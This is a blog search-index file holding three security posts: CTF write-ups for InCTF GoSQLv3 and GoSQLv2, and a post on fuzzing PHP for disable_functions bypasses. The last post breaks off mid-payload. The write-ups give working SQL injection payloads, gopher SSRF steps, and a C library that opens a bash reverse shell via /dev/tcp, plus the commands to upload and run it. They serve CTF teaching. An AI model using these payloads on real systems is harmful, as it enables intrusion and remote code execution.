<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>InCTF-2020 GoSQLv3 challenge writeup</title>
      <link href="/2020/08/02/inctf2020-gosqlv3-challenge-writeup/"/>
      <url>/2020/08/02/inctf2020-gosqlv3-challenge-writeup/</url>
      
        <content type="html"><![CDATA[<p>Hey, I am SpyD3r(<a href="https://twitter.com/TarunkantG">@TarunkantG</a>) and in this blog I will be discussing GoSQLv3 challenge that I made for InCTF-2020 and a lot of SQLi tricks.<br>The GoSQLv3 challenge got 8 solves but I would say the only one full solve that was RCE by the EpicLeetTeam(Congratulations for the first blood) but mistakenly the team has saved the flag on one of the table and most of the team just read the flag from that table.  </p><p>This challenge was next version of last year’s GoSQLv2, you can take a look at the writeup <a href="https://spyclub.tech/2019/10/15/inctf2019-web-challenges-writeup/">here</a>. This time also the challenge was based on the previous methodology, so it was meant that you knew what to do and how to go forward in the challenge, So only thing you need to do is exploit <strong>SQLi(2 times)+SSRF(Prev Esc to superuser+Create a function)</strong> and that will lead you to RCE. Before reading this writeup I suggest you to read last year <a href="https://spyclub.tech/2019/10/15/inctf2019-web-challenges-writeup/">writeup</a> first.<br>This challenge is just little different from the last year, the thing is, this time I have used postgreSQL instead of MySQL so you have to use postgreSQL tricks to get <code>admin</code> and the different exploit to get database name(<code>current_database()</code>) and postgres Username(<code>current_user</code>).  </p><p>There is one more thing, this time you can not use Gopherus for doing SSRF because the Gopherus tool doesn’t have postgreSQL exploit, so you have to generate gopher exploit manually.  </p><p><strong>Announcing</strong> a new version of <a href="https://github.com/tarunkant/Gopherus">Gopherus</a> which contains PostgreSQL exploit, so start doing <code>git pull</code>.  </p><p>Okay, so let’s start solving this challenge  </p><p>There is two place where user can input, <code>name</code> and <code>column</code>.  </p><h2 id="Phase-1-Being-the-admin"><a href="#Phase-1-Being-the-admin" class="headerlink" title="Phase-1: Being the admin"></a>Phase-1: Being the admin</h2><p>You would have obviously figured out that the column name is <code>username</code> and <code>go_to</code> by checking the source.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = pg_fetch_array(<span class="variable">$ret</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">      header(<span class="string">&quot;Location:<span class="subst">&#123;$row[&#x27;go_to&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>But the problem is you can not use <code>username</code> and <code>go_to</code> directly because it is blacklisted.  </p><h3 id="Trick-1"><a href="#Trick-1" class="headerlink" title="Trick-1"></a>Trick-1</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> inctf2020;</span><br><span class="line"><span class="keyword">select</span> U<span class="operator">&amp;</span>&quot;\0075\0073\0065\0072\006e\0061\006d\0065&quot; <span class="keyword">from</span> inctf2020;</span><br></pre></td></tr></table></figure><p>Both will return the same, <code>username</code> column.  </p><p>Now you have to also bypass the <code>admin</code> keyword because that is also blacklisted, so what if we concatenate strings that make <code>admin</code> keyword. But again we can not use ‘ (Single Quote) because it is blacklisted too. If you are familiar with PostgreSQL then you would know that in postgreSQL double quoted(“) string is treated as column name, so we have find out the alternative of single quote (‘) for concatenating.</p><h3 id="Trick-2"><a href="#Trick-2" class="headerlink" title="Trick-2"></a>Trick-2</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;tarunkant&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> $$tarunkant$$;</span><br></pre></td></tr></table></figure><p>Both has the same output.  </p><p>Double pipes in PostgreSQL is used for concatenation where in MySQL it is used as the alternative for <code>OR</code>  </p><h3 id="Trick-3"><a href="#Trick-3" class="headerlink" title="Trick-3"></a>Trick-3</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;tarun&#x27;</span><span class="operator">||</span><span class="string">&#x27;kant&#x27;</span>;  <span class="operator">/</span><span class="operator">/</span> output: tarunkant</span><br></pre></td></tr></table></figure><p>So the final payload will be for going to admin page is:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=$$a$$||$$dmi$$||$$n$$&amp;column=U%26&quot;\0075\0073\0065\0072\006e\0061\006d\0065&quot;,U%26&quot;\0067\006f\005f\0074\006f&quot;</span><br></pre></td></tr></table></figure><br> Because you have to use both the columns <code>username</code> and <code>go_to</code> for going to admin page.</p><h2 id="Retrieving-postgres-username-and-database-name"><a href="#Retrieving-postgres-username-and-database-name" class="headerlink" title="Retrieving postgres username and database name"></a>Retrieving postgres username and database name</h2><p>So you have to exploit same challenge again for retrieving those data.  </p><h3 id="For-getting-username"><a href="#For-getting-username" class="headerlink" title="For getting username:"></a>For getting username:</h3><p>There exist booleans based SQL injection on <code>column</code> parameter.</p><p>Final payload:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=$$a$$||$$dmi$$||$$n$$&amp;column=power((case%0awhen%0a(lpad(current_user,1,$$$$)=$$h$$)%0athen%0a1%0aelse%0a0%0aend)%2B1,222222222222222222);%00</span><br></pre></td></tr></table></figure><br>Let’s dive into the SQLi</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">power</span>((<span class="keyword">case</span> <span class="keyword">when</span> (lpad(<span class="built_in">current_user</span>,<span class="number">1</span>,$$$$)<span class="operator">=</span>$$h$$) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="keyword">end</span>)<span class="operator">+</span><span class="number">1</span>,<span class="number">222222222222222222</span>);</span><br></pre></td></tr></table></figure><p>So if above command will create error then that input is true else wrong. That’s how you can retrieve the current username by small bruteforce.</p><h3 id="For-getting-database-name"><a href="#For-getting-database-name" class="headerlink" title="For getting database name:"></a>For getting database name:</h3><p>It is basically same, you only need to change <code>current_user</code> to <code>current_database()</code><br>Final payload:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=$$a$$||$$dmi$$||$$n$$&amp;column=power((case%0awhen%0a(lpad(current_database(),1,$$$$)=$$g$$)%0athen%0a1%0aelse%0a0%0aend)%2B1,222222222222222222);%00</span><br></pre></td></tr></table></figure></p><p>You can find the script <a href="https://github.com/tarunkant/CTF/tree/master/InCTF2020/exploit">here</a> which will give you the postgres username and database name.  </p><h2 id="Phase-2-SSRF"><a href="#Phase-2-SSRF" class="headerlink" title="Phase-2: SSRF"></a>Phase-2: SSRF</h2><p>As I said gopherus does not have postgresql exploit, so you have to first create a user which is not protected with the password then you have to collect the packets from wireshark. The thing is you have to use python or any other script(with <code>ssl=disable</code>) for collecting decrypted packets or else the packets would be encrypted.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">payload</span>):</span>                                                                                           </span><br><span class="line">    query = payload                                                                                           </span><br><span class="line">    con = psycopg2.connect(host=<span class="string">&quot;127.0.0.1&quot;</span>, database=<span class="string">&quot;gosqlv3&quot;</span>, user=<span class="string">&quot;postgres&quot;</span>, sslmode=<span class="string">&quot;disable&quot;</span>)         </span><br><span class="line">    con.autocommit=<span class="literal">True</span>                                                                                       </span><br><span class="line">    curson=con.cursor()                                                                                       </span><br><span class="line">    curson.execute(query)                                                                                     </span><br><span class="line">    <span class="built_in">print</span> curson.fetchall()    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>After that you get the packets, convert them into gopher format.  </p><p>Now, after the CTF you can also use update Gopherus too to generate postgreSQL exploit.  </p><p>Now if you have the gopher formatted exploit, you can use that to do SSRF on the application.  </p><p>Now these are the steps you need to follow that will lead you to RCE:</p><ol><li><p>Check the user privileges:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> r.rolname, r.rolsuper, <span class="keyword">ARRAY</span>(<span class="keyword">SELECT</span> b.rolname <span class="keyword">FROM</span> pg_catalog.pg_auth_members m <span class="keyword">JOIN</span> pg_catalog.pg_roles b <span class="keyword">ON</span> (m.roleid <span class="operator">=</span> b.oid) <span class="keyword">WHERE</span> m.member <span class="operator">=</span> r.oid) <span class="keyword">as</span> memberof <span class="keyword">FROM</span> pg_catalog.pg_roles r <span class="keyword">WHERE</span> r.rolname <span class="operator">!</span><span class="operator">~</span> <span class="string">&#x27;^pg_ &#x27;</span><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>The above command is an alternative for <code>\du</code>.<br>the output would be:</p><p>| rolname   |      rolsuper      |  memberof |<br>|———-|:————-:|——:|<br>| honeysingh | f        | {inctf}   |<br>| inctf      | t        | {} |<br>| postgres   | t        | {} |</p></li></ol><p>So from this you can see that user <code>honeysingh</code> is member of <code>inctf</code> which has <code>superuser</code> privileges. So for querying as superuser you have to put <code>set role inctf;</code> before making any superuser query.</p><ol start="2"><li>Now you have to create functions, which needs superuser role.</li><li>For creating function there should be binary file at system from where you will import the function. So now next task is to upload a binary on the application.</li><li><p>Create a exploit.c file:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;postgres.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;fmgr.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PG_MODULE_MAGIC</span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">text *<span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;sh -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Compile exploit.c</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit.c -I`pg_config --includedir-server` -fPIC -shared -o exploit.so</span><br></pre></td></tr></table></figure></li><li><p>Now covert that binary into byte</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat exploit.so | xxd -ps | tr -d <span class="string">&quot;\n&quot;</span> &gt; a.txt--&gt; will give you the bytes of the .so file</span><br></pre></td></tr></table></figure></li><li><p>Now convert those into blocks so that we can send those to the application</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">number = randint(<span class="number">1000</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Usage:python &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot;inputfile&quot;</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    fileobj = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>],<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    t = -<span class="number">1</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> fileobj.read():</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        s += b</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">4096</span> == <span class="number">0</span>:</span><br><span class="line">            t = t + <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;insert into pg_largeobject values (&#123;number&#125;, &#123;block&#125;, decode(</span></span><br><span class="line"><span class="string">\&#x27;&#123;payload&#125;\&#x27;,\&#x27;hex\&#x27;));\n&#x27;</span>\</span><br><span class="line">                    .<span class="built_in">format</span>(number=number, block=t, payload=s)</span><br><span class="line">            s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    fileobj.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Run:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py a.txt  --&gt; will convert the bytes into blocks that is supported by the postgreSQL</span><br></pre></td></tr></table></figure></li><li><p>Generate payload for the following queries in the order and submit in the application:</p><ul><li><code>set role inctf;SELECT lo_create(1635);</code>            // here 1635 is random number generated by the test.py. This command will create a loid in the application.</li><li>Use all the queries outputed by test.py      // Prefix with <code>set role inctf;</code>. From this command you will put bytes of your malicious binary on the loid.</li><li><code>set role inctf;SELECT lo_export(1635, &#39;/tmp/exploit.so&#39;);</code> // Now you are exporting the loid data back again to .so file and that’s how you can upload any binary/file to the application.</li><li><code>set role inctf;CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS &#39;/tmp/exploit.so&#39;, &#39;exec&#39; LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;</code> // Now you are creating a function importing from the malicious binary.</li><li><code>select sys_eval(&#39;id&#39;);</code>  // Executing the binary</li></ul></li></ol><ol start="9"><li>Now you would see the you just got reverse shell in your server.</li><li><code>cd /;./readFlag</code></li></ol><p>I hope you guys had fun playing InCTF and solving this challenge and also hope you would have learned something new.</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> Writeup </tag>
            
            <tag> InCTF </tag>
            
            <tag> Gopherus </tag>
            
            <tag> SQL </tag>
            
            <tag> RCE </tag>
            
            <tag> PHP </tag>
            
            <tag> disable_functions </tag>
            
            <tag> PostgreSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fuzzphunc gets me new functions to bypass PHP disable_functions</title>
      <link href="/2019/10/26/bypass-disable-functions/"/>
      <url>/2019/10/26/bypass-disable-functions/</url>
      
        <content type="html"><![CDATA[<p>Hey, I am SpyD3r(<a href="https://twitter.com/TarunkantG">@TarunkantG</a>) and in this blog I will be discussing the new functions I got to bypass PHP disable_functions and also the other tricks to do the same.<br>Me and one of my teammate <a href="https://twitter.com/__c3rb3ru5__">@__c3rb3ru5__</a> made <code>lazyFuzzer</code> to fuzz the all PHP functions to check if they call <code>execve</code> system call internally. In this blog mainly I will be discussing the difficulties we faced to make the Fuzzer and how we certainly solved those issues to get more new functions.  </p><p>I also made a tool on the top of the findings this fuzzer did, here,<br><strong>Announcing</strong> <a href="https://github.com/teambi0s/dfunc-bypasser">dfunc-bypasser</a> for letting you know how strong your disable_function is and how you can bypass that. You can get the more details on the same while reading this blog.</p><p><strong>Note:</strong> The functions I got are not in the default php installation, instead the php modules which get installed sometimes during normal installation.  </p><p>So let’s dive into details:</p><h1 id="How-to-Bypass-PHP-disable-functions"><a href="#How-to-Bypass-PHP-disable-functions" class="headerlink" title="How to Bypass PHP disable_functions:"></a>How to Bypass PHP disable_functions:</h1><p>There are 3 ways(known to me) to bypass disable_functions:  </p><ol><li><p>Using <code>LD_PRELOAD</code>: You use the PHP function which calls <code>execve</code> syscall internally, and using <code>LD_PRELOAD</code> you overwrite the definition and get the shell. You can get the detailed writeup to do the same <a href="https://spyclub.tech/2019/10/15/inctf2019-web-challenges-writeup/#Copy-Cat">here</a>. The known functions to do the same are <code>mail</code> and <code>error_log</code>. Or you can use <code>php-imagick</code> library to change the file type, which sometimes call <code>execve</code> internally, overwrite any definition from them to get the shell, for this you can get the detailed writeup <a href="https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/">here</a>.</p></li><li><p>Using <code>PHP-FPM</code>: If the <code>PHP-FPM</code> service is running in the server, you can use that to get the shell, you can use <a href="https://github.com/tarunkant/Gopherus">Gopherus</a> to generate the payload of <code>FastCGI</code> then urldecode it and write that payload to the sock file or the port of <code>php-fpm</code> using <code>fsockopen</code> and <code>fwrite</code>. You can get the detailed writeup of the same <a href="https://spyclub.tech/2019/10/15/inctf2019-web-challenges-writeup/#GoSQLv2">here</a>.</p></li><li><p>Or use any N-Day PHP exploit, which is not fixed in the given version in order to get the shell.</p></li></ol><h1 id="How-the-idea-came"><a href="#How-the-idea-came" class="headerlink" title="How the idea came:"></a>How the idea came:</h1><p>While playing the a lot of CTFs, I have seen that, these time a lot of CTF challenges needed to bypass the disable_functions whereas the <strong>well-known</strong> function for doing the same are only two(<code>mail</code> and <code>error_log</code>). So that gave me the idea to fuzz all the php functions and check if they call <code>execve</code> internally.</p><h1 id="How-I-started"><a href="#How-I-started" class="headerlink" title="How I started:"></a>How I started:</h1><p>First, I installed all the php-modules on the server and thought of fuzzing the functions from it’s minimum arguments to max arguments with the flag range of (-10,10), so for this we needed to know which functions takes how many arguments to run and if the argument type is string then which string should go, if it is file then which file and so on we need to figure out for all argument type. So now I have following task to complete:</p><h2 id="Getting-the-no-and-type-of-arguments-of-the-php-functions"><a href="#Getting-the-no-and-type-of-arguments-of-the-php-functions" class="headerlink" title="Getting the no. and type of arguments of the php functions:"></a>Getting the no. and type of arguments of the php functions:</h2><p>First thing was to find out the, what number of argument the function needs? so I used the error messages of the functions which says, <code>at least</code>, <code>at most</code>, <code>exactly</code> the number of argument should be used.  </p><p><img src="/images/photos/blog3.0.png" alt="a">  </p><p><strong>Note:</strong> For this I could have also used <a href="https://www.php.net/manual/en/class.reflectionfunction.php">ReflectionFunction</a> class to find out the max and the least numbers of arguments needed.  </p><p><img src="/images/photos/blog3.2.png" alt="a"></p><p>Now, we needed to check, what type of input the function takes? that also we solved using error ;). But the problem here is, you can’t get the types of arguments all in the once. You have to set the arguments such that the php can check the next argument.  </p><p><img src="/images/photos/blog3.1.png" alt="a">  </p><p><strong>Note:</strong> For this you <strong>can’t</strong> use <code>ReflectionFunction</code> class because, this class mainly works for user defined functions not for php pre-defined(internal) functions.</p><p>As this will be too much of the task to do, I went to find a interesting string which can satisfy all types.</p><h2 id="Making-of-Input"><a href="#Making-of-Input" class="headerlink" title="Making of Input:"></a>Making of Input:</h2><p>This was trivial task to do.<br>As the 1st step gave us the type of arguments to be send to the function. The types can be one of these: <code>int</code>,<code>string</code>,<code>file</code>,<code>resource</code>,<code>boolean</code>,<code>float</code>,<code>Array</code>,<code>Object</code>,<code>NULL</code>. So if you start fuzzing a function having argument type of int, string, file then your fuzzer will run for <code>3!</code> times(As described earlier).<br>Now the task to find the string which satisfy almost all of these argument types. So I came with interesting string<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;1/../../../../../../../etc/passwd&#x27;</span><br></pre></td></tr></table></figure><br>This String can be used as <code>string</code>,<code>int</code>,<code>file</code> and <code>bool</code></p><p><img src="/images/photos/blog3.3.png" alt="a"></p><p>For the <code>flag</code> argument, we will be using integers from the range of (-10,10).<br>For the <code>Object</code> type argument, most of the time functions don’t take the input as Object.<br><code>Null</code> is satisfied, because we fuzzed from min to max arguments.<br><code>Array</code> we didn’t do because it’s not too common.<br>So now we have string which almost contains all of the types but not <code>Resource</code>.</p><h2 id="Why-we-couldn’t-do-fuzzing-on-resource-type-parameter"><a href="#Why-we-couldn’t-do-fuzzing-on-resource-type-parameter" class="headerlink" title="Why we couldn’t do fuzzing on resource type parameter:"></a>Why we couldn’t do fuzzing on resource type parameter:</h2><p>There are two best answer for this:  </p><ol><li>The main problem on fuzzing resource type argument was, How we will get to know that what and whose resource does the argument need? Let’s say one example, <code>socket_connect</code>, this function need a resource argument, now how will you know that, which resource does this function need without checking the PHP manual of that ;).<br>Btw if anyone know how to find out using cli then please give me a ping.</li><li>And the second answer is itself the name, <code>lazyFuzzer</code>.</li></ol><h1 id="Result-of-Fuzzing"><a href="#Result-of-Fuzzing" class="headerlink" title="Result of Fuzzing:"></a>Result of Fuzzing:</h1><p>I got 4 new functions which can bypass PHP disable_functions using <code>LD_PRELOAD</code>. All these functions are in different different modules of PHP.  </p><ol><li><code>mb_send_mail</code> : If your system has <code>php-mbstring</code> module installed then this function can be used to bypass php disable_functions.</li><li><code>imap_mail</code> : If your system has <code>php-imap</code> module installed then this function also can be used to bypass the php disable_functions.</li><li><code>libvirt_connect</code> : If your system has <code>php-libvirt-php</code> module installed then this function also can be used to bypass disable_functions.</li><li><code>gnupg_init</code> : If your system has <code>php-gnupg</code> module installed then this function also can be used to bypass disable_functions.</li></ol><p>You can get the file which has been used for this testing, here, <a href="https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py">lazyFuzzer.py</a>.</p><h1 id="dfunc-bypasser-tool"><a href="#dfunc-bypasser-tool" class="headerlink" title="dfunc-bypasser tool:"></a>dfunc-bypasser tool:</h1><p>This tool is to test how much strong your disable_functions is. The tool takes your input and tells you that, which function could possibly bypass the given disable_functions.<br>You can install this tool from <a href="https://github.com/teambi0s/dfunc-bypasser">here</a>.  </p><h2 id="Some-Screenshots-of-the-same"><a href="#Some-Screenshots-of-the-same" class="headerlink" title="Some Screenshots of the same:"></a>Some Screenshots of the same:</h2><p><img src="/images/photos/blog3.4.png" alt="a"><br><img src="/images/photos/blog3.5.png" alt="a"></p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> PHP </tag>
            
            <tag> disable_functions </tag>
            
            <tag> Bypass </tag>
            
            <tag> fuzzphunc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>InCTF-2019 Web challenges writeup</title>
      <link href="/2019/10/15/inctf2019-web-challenges-writeup/"/>
      <url>/2019/10/15/inctf2019-web-challenges-writeup/</url>
      
        <content type="html"><![CDATA[<p>Hey, I am SpyD3r(<a href="https://twitter.com/TarunkantG">@TarunkantG</a>) and in this blog I will be discussing all the 5 web challenges that I made for InCTF-2019 and a lot of SQLi and bypassing disable_functions tricks.<br>The first challenge was Copy-Cat which had 3 solves, second challenge was GoSQLv2 which got 2 solves and the other challenge were based on PHP-internals from which PHP+2 got least solves that is 1.  </p><h2 id="GoSQLv2"><a href="#GoSQLv2" class="headerlink" title="GoSQLv2"></a>GoSQLv2</h2><p>This challenge was next version of last year’s GoSQL, you can take look at the writeup <a href="https://spyclub.tech/2018/10/08/2018-10-08-inctf2018-web-challenge-writeup/">here</a>. This time, this challenge wasn’t that hard because you knew what to do and how to go forward in the challenge, So only thing you need to do exploit <strong>SQLi(2 times)+SSRF+bypass disable_functions</strong> and finally you need to get RCE. Before reading this writeup I suggest you to read last year <a href="https://spyclub.tech/2018/10/08/2018-10-08-inctf2018-web-challenge-writeup/">writeup</a> first.<br>This challenge is not much different from the last year, only thing is, this time you have to use different SQL tricks to get admin and the different exploit to get database <code>user()</code>. Then same SSRF (using <a href="https://github.com/tarunkant/Gopherus">Gopherus</a>) then finally need to bypass disable_functions to get RCE.<br>So the first thing I hope you did was <code>diff</code> didn’t you?<br>Yeah, same thing I would have done and that was the right way to do it. So when you <code>diff</code> you will get to know that you can’t use <code>UTF-8</code> charset (So last year trick won’t work ;). And these things which were blocked earlier, this time not:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|-|0|&#x27;|</span><br></pre></td></tr></table></figure><br>And these things which were <strong>not</strong> blocked earlier, this time extra added:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|ad|min|\|0b|0x|having|insert|decode|in|sleep|&gt;|exp|</span><br></pre></td></tr></table></figure><br>So as you can see we can use Single Quote( ‘ ), and for commenting ( - ) is it only used for commenting??</p><h3 id="Trick-1"><a href="#Trick-1" class="headerlink" title="Trick-1"></a>Trick-1</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> login <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="operator">-</span>sleep(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/photos/blog4.0.png" alt="a"></p><p>This will sleep for number of entries in the database (in this case 12 sec).<br>So that’s how you can dump the database, but here you can’t use <code>sleep</code> because it is also blacklisted. So the main idea is here you can execute SQL commands after putting <code>-</code>.</p><p>For getting <code>admin</code> you don’t have to do anything much, just needed to concatenate strings.</p><h3 id="Trick-2"><a href="#Trick-2" class="headerlink" title="Trick-2"></a>Trick-2</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> login <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;t&#x27;</span> <span class="string">&#x27;a&#x27;</span> <span class="string">&#x27;r&#x27;</span> <span class="string">&#x27;u&#x27;</span> <span class="string">&#x27;n&#x27;</span> <span class="string">&#x27;k&#x27;</span> <span class="string">&#x27;a&#x27;</span> <span class="string">&#x27;n&#x27;</span> <span class="string">&#x27;t&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/images/photos/blog4.1.png" alt="a"></p><p>So the final payload I used to get admin was:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=a%27%0a%27d%27%0a%27m%27%0a%27i&#x27;%0a&#x27;n</span><br></pre></td></tr></table></figure></p><p>Now you need to find another SQLi to get <code>mysql_user</code> How?<br>By taking the advantage of this:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h4&gt;You are not admin &quot;</span> . <span class="string">&quot;&lt;/h4&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;h4&gt;Having a query problem&quot;</span> . <span class="string">&quot;&lt;/h4&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>We will make MySQL to return some time <code>query problem</code> and some time <code>not admin</code>, and doing that we can get <code>mysql_user</code>.  </p><h3 id="Trick-3"><a href="#Trick-3" class="headerlink" title="Trick-3"></a>Trick-3</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> login <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="operator">-</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>)<span class="operator">+</span><span class="number">1</span>);  </span><br><span class="line"># This will <span class="keyword">return</span> <span class="keyword">empty</span> string, <span class="keyword">and</span> hence it will <span class="keyword">return</span> `You <span class="keyword">are</span> <span class="keyword">not</span> admin`</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> login <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="operator">-</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>)<span class="operator">+</span><span class="number">1</span>);  